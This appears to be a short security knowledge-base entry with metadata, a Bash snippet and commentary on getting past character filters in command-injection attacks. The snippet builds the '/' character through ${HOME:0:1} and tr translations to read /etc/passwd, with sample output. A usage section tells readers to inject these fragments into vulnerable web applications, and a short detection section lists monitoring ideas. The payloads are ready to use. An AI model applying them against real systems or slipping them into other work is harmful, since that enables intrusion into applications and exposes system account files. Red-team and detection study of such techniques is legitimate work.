---
id: bdbbdf70-c150-4955-856e-81aa5fb257ab
name: Bash-Filter-Bypass-Demo-for-Command-Injection
type: code
language: Bash
verified: true
created_at: '2023-04-06T03:55:57.211905+00:00'
updated_at: '2023-04-06T03:55:57.223042+00:00'
platforms:
  - Linux
tags:
  - command-injection
  - bypass
  - demo
validated: true
---

# Bash-Filter-Bypass-Demo-for-Command-Injection

## Code

```bash
swissky@crashlab:~$ echo ${HOME:0:1}
/

swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ echo . | tr '!-0' '"-1'
/

swissky@crashlab:~$ tr '!-0' '"-1' <<< .
/

swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
root:x:0:0:root:/root:/bin/bash
```

## Description

This code snippet demonstrates a sequence of Bash commands to bypass character filters in command injection attacks. It shows extracting / via $HOME expansion, reading /etc/passwd with it, and alternative tr-based translations to generate / from ., culminating in a full path construction using command substitution. The snippet includes sample outputs for verification.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| ${HOME:0:1} | Expansion for root slash | / |
| '!-0' | tr source set | '!-0' |
| '"-1' | tr target set | '"-1' |
| . | Input for translation | . |

## Usage

Execute in a Bash shell to test bypass techniques. In attacks, inject fragments into vulnerable applications (e.g., web forms executing system()). Start with parameter expansion for simple filters, escalate to tr for stricter ones. Useful for red team exercises simulating restricted environments.

## Detection

- Monitor for unusual Bash expansions like ${VAR:0:1} in logs or process arguments.
- Detect tr invocations with suspicious character sets (e.g., '!-0' to '"-1').
- Alert on accesses to /etc/passwd from non-standard processes.
- Use syscall monitoring (e.g., auditd) for execve of cat with dynamic paths.

## Related

- [[procedures/Linux-Bash-Command-Injection-with-Filter-Bypass]]
